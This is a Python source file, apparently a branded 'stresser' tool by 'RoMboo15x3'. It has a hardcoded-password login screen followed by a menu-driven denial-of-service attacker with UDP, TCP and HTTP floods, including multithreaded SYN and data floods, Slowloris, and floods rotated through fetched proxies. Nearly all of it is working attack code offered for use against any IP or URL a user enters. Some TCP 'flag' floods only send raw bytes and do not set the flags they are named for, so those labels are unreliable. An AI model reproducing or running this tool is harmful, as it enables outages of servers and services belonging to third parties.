import os
import time
from getpass import getpass
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

correct_username = "rombo"
correct_password = "rombo"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def hacker_background():
    art = """
     ██████╗░░█████╗░███╗░░░███╗██████╗░░█████╗░
     ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔══██╗
     ██████╔╝██║░░██║██╔████╔██║██████╦╝██║░░██║
     ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██║░░██║
     ██║░░██║╚█████╔╝██║░╚═╝░██║██████╦╝╚█████╔╝
     ╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═════╝░░╚════╝░
"""
    console.print(Panel(art, style="bold red"))

def show_ascii_art():
    ascii_art = """
________________________________________________¶¶_¶¶¶¶¶¶¶¶¶
______________________________________________¶¶¶¶________¶¶
____________________________________________¶¶_¶¶¶_______¶¶
_____¶¶¶¶¶¶¶¶_____¶¶___¶¶¶¶_______________¶¶___¶¶______¶¶
___¶¶¶______¶¶¶__¶¶¶__¶¶________________¶¶____¶¶¶_____¶¶
____________¶¶¶__¶¶_¶¶¶_______________¶¶______¶¶_____¶¶
___¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶____¶¶¶¶¶¶¶¶¶__¶¶_______¶¶¶_____¶¶
_¶¶¶¶______¶¶¶__¶¶_¶¶¶___¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶
¶¶¶_______¶¶¶__¶¶¶__¶¶¶_____________________¶¶¶_____¶¶
¶¶¶¶____¶¶¶¶¶__¶¶____¶¶¶____________________¶¶_____¶¶
_¶¶¶¶¶¶¶¶_¶¶¶__¶¶_____¶¶____________________¶¶_____¶¶
______________________________________________________¶¶__
________________________________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
_______________________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__
________________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________
__________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________________
_________________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶______________________
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________________________
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶_¶¶¶¶¶¶¶¶_________________________
¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶___¶__¶¶¶¶¶¶________________________
_¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶___¶¶¶¶¶¶_______________________
__¶¶¶¶¶¶¶¶¶______¶¶¶¶¶_______¶¶¶¶¶¶¶______________________
___¶¶¶¶¶¶________¶¶¶¶¶_________¶¶¶¶¶¶¶____________________
____¶¶¶¶_________¶¶¶¶¶__________¶¶¶¶¶¶¶¶__________________
"""
    console.print(Text(ascii_art, style="bold red"))
def animate_title():
    positions = ["   15x3", "15x3   "]
    for _ in range(6):
        for pos in positions:
            clear()
            console.print(Panel(Text(pos, justify="center", style="bold red"), border_style="red"))
            time.sleep(0.3)

def login():
    clear()
    hacker_background()

    for _ in range(3):
        console.print("[bold red]Username[/]: ", end="")
        username = input()
        password = getpass("[bold red]Password[/]: ")

        if username == correct_username and password == correct_password:
            console.print("\n[bold green]⚰ Access Granted![/]\n")
            time.sleep(1)
            animate_title()
            clear()
            show_ascii_art()
            time.sleep(1.5)
            console.print(Panel("[bold red]      15x3 methods list[/]", border_style="bright_red"))
            return
        else:
            console.print("[bold red]☯ Wrong credentials! Try again.[/]")
            time.sleep(1)
            clear()
            hacker_background()

    console.print("[bold red]☯ Access Denied![/]")

# Start the system
login()
import socket
import random
import time
import threading
import requests
from colorama import init, Fore

# Initialize Colorama
init(autoreset=True)

# Set window title
print(f"\033]0;Tools 15x3.Cam V2.0 By RoMboo15x3\007", end="", flush=True)

# ASCII Art
ASCII_ART = Fore.RED + """
     ██████╗░░█████╗░███╗░░░███╗██████╗░░█████╗░
     ██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔══██╗
     ██████╔╝██║░░██║██╔████╔██║██████╦╝██║░░██║
     ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██║░░██║
     ██║░░██║╚█████╔╝██║░╚═╝░██║██████╦╝╚█████╔╝
     ╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═════╝░░╚════╝░
        15x3 V5.0 - Made by RoMboo15x3
"""

# Function to download proxies from a URL
def fetch_proxies():
    instagram_account = "its_rombo15"
    url = "https://example.com/proxies.txt"  # Replace with actual URL for proxies
    try:
        response = requests.get(url, timeout=5)
        proxies = response.text.splitlines()
        return [p for p in proxies if ":" in p]  # Filter to keep valid proxies only
    except Exception as e:
        print(Fore.RED + f"[☠️] Failed to fetch proxies: {e}")
        return []

PROXIES = fetch_proxies()

# UDP Flood Methods
def udp_plain_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"A" * packet_size
    print(Fore.CYAN + f"[☠️] UDP Plain Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def udp_random_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Random Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def udp_burst_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Burst Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            for _ in range(10):
                payload = random.randbytes(packet_size)
                sock.sendto(payload, (ip, port))
                packet_count += 1
            time.sleep(0.1)
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def udp_spoof_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[HDA BADI] UDP Spoof Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets (Spoof simulated).")

def udp_frag_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Frag Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size // 2)
            sock.sendto(payload, (ip, port))
            sock.sendto(payload, (ip, port))
            packet_count += 2
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def udp_pulse_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] UDP Pulse Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            for _ in range(5):
                sock.sendto(payload, (ip, port))
                packet_count += 1
            time.sleep(random.uniform(0.05, 0.2))  # Random pulse delay
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def udp_echo_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = b"ECHO" + random.randbytes(packet_size - 4)
    print(Fore.CYAN + f"[🚀] UDP Echo Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def udp_multicast_flood(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    multicast_ip = f"224.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    print(Fore.CYAN + f"[🚀] UDP Multicast Flood on {multicast_ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            payload = random.randbytes(packet_size)
            sock.sendto(payload, (multicast_ip, port))
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets (Multicast simulated).")

# TCP Flood Methods
def tcp_syn_flood_single(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP SYN Flood (Single) on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} SYN packets.")

def tcp_syn_flood_multi(ip, port, duration):
    end_time = time.time() + duration
    packet_count = [0]
    def syn_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        while time.time() < end_time:
            try:
                sock.connect_ex((ip, port))
                packet_count[0] += 1
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            except:
                pass
        sock.close()
    print(Fore.CYAN + f"[🚀] TCP SYN Flood (Multi) on {ip}:{port} | {duration}s...")
    threads = [threading.Thread(target=syn_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[☠️] Done! Sent {packet_count[0]} SYN packets.")

def tcp_data_flood_single(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = random.randbytes(packet_size)
    print(Fore.CYAN + f"[🚀] TCP Data Flood (Single) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(payload)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} packets.")

def tcp_data_flood_multi(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = [0]
    def data_worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payload = random.randbytes(packet_size)
        try:
            sock.connect((ip, port))
            while time.time() < end_time:
                sock.send(payload)
                packet_count[0] += 1
        except:
            pass
        sock.close()
    print(Fore.CYAN + f"[🚀] TCP Data Flood (Multi) on {ip}:{port} | {packet_size} bytes | {duration}s...")
    threads = [threading.Thread(target=data_worker) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    print(Fore.GREEN + f"[☠️] Done! Sent {packet_count[0]} packets.")

def tcp_ack_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP ACK Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x00" * 10)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} ACK packets.")

def tcp_rst_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP RST Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock.connect_ex((ip, port))
            sock.close()
            packet_count += 1
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} RST packets.")

def tcp_xmas_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP XMAS Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\xFF" * 10)
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} XMAS packets.")

def tcp_fin_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP FIN Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x01" * 10)  # Simulate FIN flag
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} FIN packets.")

def tcp_psh_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP PSH Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x08" * 10)  # Simulate PSH flag
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} PSH packets.")

def tcp_window_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    end_time = time.time() + duration
    packet_count = 0
    print(Fore.CYAN + f"[🚀] TCP Window Flood on {ip}:{port} | {duration}s...")
    try:
        sock.connect((ip, port))
        while time.time() < end_time:
            sock.send(b"\x00" * random.randint(1, 100))  # Random window size
            packet_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        sock.close()
        print(Fore.GREEN + f"[☠️] Done! Sent {packet_count} Window packets.")

# HTTP/HTTPS Flood Methods
def http_get_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP GET Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.get(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    print(Fore.GREEN + f"[☠️] Done! Sent {request_count} GET requests.")

def http_post_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP POST Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.post(url, data={"flood": "data" * 100}, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    print(Fore.GREEN + f"[☠️] Done! Sent {request_count} POST requests.") ##made by elitestresser.club

def https_slowloris(url, duration):
    end_time = time.time() + duration
    connection_count = 0
    sockets = []
    print(Fore.CYAN + f"[🚀] HTTPS Slowloris on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((url.split("/")[2], 443))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + url.split("/")[2].encode() + b"\r\n")
            sockets.append(sock)
            connection_count += 1
            time.sleep(0.1)
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    finally:
        for sock in sockets:
            sock.close()
        print(Fore.GREEN + f"[☠️] Done! Opened {connection_count} connections.")

def http_head_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP HEAD Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            requests.head(url, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    print(Fore.GREEN + f"[☠️] Done! Sent {request_count} HEAD requests.")

def http_random_ua_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101", ##elitestresser.club
        "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36",
    ]
    print(Fore.CYAN + f"[🚀] HTTP Random UA Flood on {url} | {duration}s...")
    try:
        while time.time() < end_time:
            proxy = random.choice(PROXIES) if PROXIES else None
            proxies = {"http": f"http://{proxy}"} if proxy else None
            headers = {"User-Agent": random.choice(user_agents)}
            requests.get(url, headers=headers, proxies=proxies, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    print(Fore.GREEN + f"[☠️] Done! Sent {request_count} requests with random UAs.")

def http_proxy_flood(url, duration):
    end_time = time.time() + duration
    request_count = 0
    print(Fore.CYAN + f"[🚀] HTTP Proxy Flood on {url} | {duration}s (Proxies: {len(PROXIES)})...")
    try:
        while time.time() < end_time:
            proxy = random.choice(PROXIES) if PROXIES else None
            proxies = {"http": f"http://{proxy}"} if proxy else None
            requests.get(url, proxies=proxies, timeout=1)
            request_count += 1
    except Exception as e:
        print(Fore.RED + f"[☠️] Error: {e}")
    print(Fore.GREEN + f"[☠️] Done! Sent {request_count} proxied requests.")

# Validation Function
def validate_input(prompt, min_val, max_val, input_type=int):
    while True:
        try:
            value = input_type(input(Fore.LIGHTBLUE_EX + prompt))
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[☠️] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[☠️] Invalid input! Numbers only.")

def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "🔹 Protocols 🔹")
    print("  1. UDP 🌊")
    print("  2. TCP ⚡")
    print("  3. HTTP/HTTPS 🌐")
    protocol = input(Fore.LIGHTBLUE_EX + "Select protocol (1-3): ").strip()

    if protocol == "1":  # UDP
        print(Fore.LIGHTBLUE_EX + "\n🔹 UDP Methods 🔹")
        print("  1. Plain  2. Random  3. Burst  4. Spoof  5. Frag")
        print("  6. Pulse  7. Echo  8. Multicast")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-8): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        methods = {
            "1": udp_plain_flood, "2": udp_random_flood, "3": udp_burst_flood,
            "4": udp_spoof_flood, "5": udp_frag_flood, "6": udp_pulse_flood,
            "7": udp_echo_flood, "8": udp_multicast_flood
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[☠️] Invalid UDP method!")

    elif protocol == "2":  # TCP
        print(Fore.LIGHTBLUE_EX + "\n🔹 TCP Methods 🔹")
        print("  1. SYN Single  2. SYN Multi  3. Data Single  4. Data Multi")
        print("  5. ACK  6. RST  7. XMAS  8. FIN  9. PSH  10. Window")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-10): ").strip()

        ip = input(Fore.LIGHTBLUE_EX + "Enter server IP: ")
        port = validate_input("Enter port (1-65535): ", 1, 65535)
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)
        packet_size = None
        if method in ["3", "4"]:
            packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        if method == "1":
            tcp_syn_flood_single(ip, port, duration)
        elif method == "2":
            tcp_syn_flood_multi(ip, port, duration)
        elif method == "3":
            tcp_data_flood_single(ip, port, duration, packet_size)
        elif method == "4":
            tcp_data_flood_multi(ip, port, duration, packet_size)
        elif method == "5":
            tcp_ack_flood(ip, port, duration)
        elif method == "6":
            tcp_rst_flood(ip, port, duration)
        elif method == "7":
            tcp_xmas_flood(ip, port, duration)
        elif method == "8":
            tcp_fin_flood(ip, port, duration)
        elif method == "9":
            tcp_psh_flood(ip, port, duration)
        elif method == "10":
            tcp_window_flood(ip, port, duration)
        else:
            print(Fore.RED + "[☠️] Invalid TCP method!")

    elif protocol == "3":  # HTTP/HTTPS
        print(Fore.LIGHTBLUE_EX + "\n🔹 HTTP/HTTPS Methods 🔹")
        print("  1. GET  2. POST  3. Slowloris  4. HEAD  5. Random UA  6. Proxy")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-6): ").strip()

        url = input(Fore.LIGHTBLUE_EX + "Enter URL (e.g., http://example.com): ")
        duration = validate_input("Enter duration (seconds): ", 1, float('inf'), float)

        if method == "1":
            http_get_flood(url, duration)
        elif method == "2":
            http_post_flood(url, duration)
        elif method == "3":
            https_slowloris(url, duration)
        elif method == "4":
            http_head_flood(url, duration)
        elif method == "5":
            http_random_ua_flood(url, duration)
        elif method == "6":
            http_proxy_flood(url, duration)
        else:
            print(Fore.RED + "[☠️] Invalid HTTP/HTTPS method!")

    else:
        print(Fore.RED + "[☠️] Invalid protocol!")

if __name__ == "__main__":
    main()
